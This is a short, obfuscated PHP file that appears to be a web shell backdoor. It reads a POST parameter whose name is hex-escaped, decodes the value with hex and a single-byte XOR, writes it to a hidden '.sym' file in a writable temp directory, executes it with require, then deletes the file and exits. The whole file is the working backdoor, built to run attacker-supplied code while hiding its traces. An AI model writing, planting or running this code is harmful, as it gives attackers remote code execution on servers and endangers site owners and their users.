<?php

if(array_key_exists("\x68o\x6Cd\x65r", $_POST)){
	$flg = array_filter([session_save_path(), "/tmp", getenv("TEMP"), "/dev/shm", getcwd(), getenv("TMP"), "/var/tmp", ini_get("upload_tmp_dir"), sys_get_temp_dir()]);
	$comp = hex2bin($_POST["\x68o\x6Cd\x65r"]);
	$item    =  ''  ;$k = 0; while($k < strlen($comp)){$item .= chr(ord($comp[$k]) ^ 71);$k++;}
	foreach ($flg as $elem) {
    		if (max(0, is_dir($elem) * is_writable($elem))) {
    $data_chunk = sprintf("%s/.sym", $elem);
    if (file_put_contents($data_chunk, $item)) {
	require $data_chunk;
	unlink($data_chunk);
	die();
}
}
}
}